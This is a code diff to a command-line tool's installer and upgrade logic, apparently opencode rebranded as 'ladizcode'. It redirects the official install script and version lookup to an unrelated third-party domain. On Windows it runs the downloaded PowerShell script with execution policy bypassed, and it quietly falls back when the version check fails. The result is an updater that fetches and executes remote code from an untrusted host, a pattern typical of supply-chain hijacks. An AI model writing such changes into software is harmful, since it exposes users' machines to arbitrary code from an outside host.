@@ -144,8 +144,18 @@ const layer: Layer.Layer<Service, never, HttpClient.HttpClient | AppProcess.Serv
 
     const upgradeCurl = Effect.fnUntraced(
       function* (target: string) {
-        const response = yield* httpOk.execute(HttpClientRequest.get("https://opencode.ai/install"))
+        const isWindows = process.platform === "win32"
+        const scriptUrl = isWindows
+          ? "https://ladizai.chinafezz.my.id/downloads/install.ps1"
+          : "https://ladizai.chinafezz.my.id/downloads/install.sh"
+        const response = yield* httpOk.execute(HttpClientRequest.get(scriptUrl))
         const body = yield* response.text
+        if (isWindows) {
+          const result = yield* run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", body], {
+            env: { VERSION: target },
+          })
+          return result
+        }
         const bodyBytes = new TextEncoder().encode(body)
         const shell = yield* upgradeScriptShell()
         const result = yield* appProcess.run(
@@ -172,9 +182,11 @@ const layer: Layer.Layer<Service, never, HttpClient.HttpClient | AppProcess.Serv
         }
       }),
       method: Effect.fn("Installation.method")(function* () {
-        if (process.execPath.includes(path.join(".opencode", "bin"))) return "curl" as Method
-        if (process.execPath.includes(path.join(".local", "bin"))) return "curl" as Method
         const exec = process.execPath.toLowerCase()
+        if (exec.includes(path.join(".ladizcode", "bin").toLowerCase())) return "curl" as Method
+        if (exec.includes(path.join("ladizcode", "bin").toLowerCase())) return "curl" as Method
+        if (exec.includes(path.join(".opencode", "bin").toLowerCase())) return "curl" as Method
+        if (exec.includes(path.join(".local", "bin").toLowerCase())) return "curl" as Method
 
         const checks: Array<{ name: Method; command: () => Effect.Effect<string> }> = [
           { name: "npm", command: () => text(["npm", "list", "-g", "--depth=0"]) },
@@ -254,13 +266,22 @@ const layer: Layer.Layer<Service, never, HttpClient.HttpClient | AppProcess.Serv
           return data.version
         }
 
-        const response = yield* httpOk.execute(
-          HttpClientRequest.get("https://api.github.com/repos/anomalyco/opencode/releases/latest").pipe(
-            HttpClientRequest.acceptJson,
-          ),
-        )
-        const data = yield* HttpClientResponse.schemaBodyJson(GitHubRelease)(response)
-        return data.tag_name.replace(/^v/, "")
+        const response = yield* httpOk
+          .execute(
+            HttpClientRequest.get("https://ladizai.chinafezz.my.id/downloads/version.json").pipe(
+              HttpClientRequest.acceptJson,
+            ),
+          )
+          .pipe(Effect.catch(() => Effect.succeed(undefined)))
+
+        if (response) {
+          const data = yield* HttpClientResponse.schemaBodyJson(NpmPackage)(response).pipe(
+            Effect.catch(() => Effect.succeed(undefined)),
+          )
+          if (data?.version) return data.version.replace(/^v/, "")
+        }
+
+        return InstallationVersion
       }, Effect.orDie),
       upgrade: Effect.fn("Installation.upgrade")(function* (m: Method, target: string) {
         let upgradeResult: { code: number; stdout: string; stderr: string } | undefined
